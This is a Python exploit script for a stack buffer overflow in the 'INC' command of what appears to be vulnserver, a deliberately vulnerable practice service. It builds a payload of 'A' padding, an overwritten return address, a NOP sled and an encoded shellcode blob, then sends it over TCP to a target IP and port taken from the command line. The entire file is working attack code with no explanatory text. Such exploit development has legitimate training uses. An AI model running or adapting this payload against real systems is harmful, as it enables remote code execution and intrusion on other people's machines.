import sys
import socket


targetIP = sys.argv[1]
targetPort = int(sys.argv[2])
l = int(sys.argv[3])


buf =  b""
buf += b"\xd9\xca\xd9\x74\x24\xf4\xbf\x49\x39\x5b\x1e\x5e\x2b"
buf += b"\xc9\xb1\x56\x83\xc6\x04\x31\x7e\x14\x03\x7e\x5d\xdb"
buf += b"\xae\xe2\xb5\x99\x51\x1b\x45\xfe\xd8\xfe\x74\x3e\xbe"
buf += b"\x8b\x26\x8e\xb4\xde\xca\x65\x98\xca\x59\x0b\x35\xfc"
buf += b"\xea\xa6\x63\x33\xeb\x9b\x50\x52\x6f\xe6\x84\xb4\x4e"
buf += b"\x29\xd9\xb5\x97\x54\x10\xe7\x40\x12\x87\x18\xe5\x6e"
buf += b"\x14\x92\xb5\x7f\x1c\x47\x0d\x81\x0d\xd6\x06\xd8\x8d"
buf += b"\xd8\xcb\x50\x84\xc2\x08\x5c\x5e\x78\xfa\x2a\x61\xa8"
buf += b"\x33\xd2\xce\x95\xfc\x21\x0e\xd1\x3a\xda\x65\x2b\x39"
buf += b"\x67\x7e\xe8\x40\xb3\x0b\xeb\xe2\x30\xab\xd7\x13\x94"
buf += b"\x2a\x93\x1f\x51\x38\xfb\x03\x64\xed\x77\x3f\xed\x10"
buf += b"\x58\xb6\xb5\x36\x7c\x93\x6e\x56\x25\x79\xc0\x67\x35"
buf += b"\x22\xbd\xcd\x3d\xce\xaa\x7f\x1c\x86\x1f\xb2\x9f\x56"
buf += b"\x08\xc5\xec\x64\x97\x7d\x7b\xc4\x50\x58\x7c\x5d\x76"
buf += b"\x5b\x52\xe5\x17\xa5\x53\x15\x31\x62\x07\x45\x29\x43"
buf += b"\x28\x0e\xa9\x6c\xfd\xba\xa3\xfa\x3e\x92\x7c\x2d\xd6"
buf += b"\xe0\x7c\xf2\xc2\x6d\x9a\xa2\x5c\x3d\x33\x03\x0d\xfd"
buf += b"\xe3\xeb\x47\xf2\xdc\x0c\x68\xd9\x74\xa6\x87\xb7\x2d"
buf += b"\x5f\x31\x92\xa6\xfe\xbe\x09\xc3\xc1\x35\xbb\x33\x8f"
buf += b"\xbd\xce\x27\xf8\xd9\x30\xb8\xf9\x4f\x30\xd2\xfd\xd9"
buf += b"\x67\x4a\xfc\x3c\x4f\xd5\xff\x6a\xcc\x12\xff\xea\xe4"
buf += b"\x69\x36\x79\x48\x06\x37\x6d\x48\xd6\x61\xe7\x48\xbe"
buf += b"\xd5\x53\x1b\xdb\x19\x4e\x08\x70\x8c\x71\x78\x24\x07"
buf += b"\x1a\x86\x13\x6f\x85\x79\x76\xf3\xc2\x85\x04\xdc\x6a"
buf += b"\xed\xf6\x5c\x8b\xed\x9c\x5c\xdb\x85\x6b\x72\xd4\x65"
buf += b"\x93\x59\xbd\xed\x1e\x0c\x0f\x8c\x1f\x05\xd1\x10\x1f"
buf += b"\xaa\xca\xa3\x5a\xc3\xed\x44\x9b\xcd\x89\x45\x9b\xf1"
buf += b"\xaf\x7a\x4d\xc8\xc5\xbd\x4d\x6f\xd5\x88\xf0\xc6\x7c"
buf += b"\xf2\xa7\x19\x55"




command = "INC "
overflow = "A" * l
bstring = command.encode() 
bstring = bstring + overflow.encode() 
bstring = bstring + b"\x4C\x22\x35\x47" 
bstring = bstring + (b"\x90" * 20)  
bstring = bstring + buf 
bstring = bstring + "\r\n".encode()
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((targetIP, targetPort))
		
	d = s.recv(1024).decode()
	s.send(bstring)
	d = s.recv(1024).decode()

	s.close()
		
		
except: 
	print("The vulnserver has crashed")
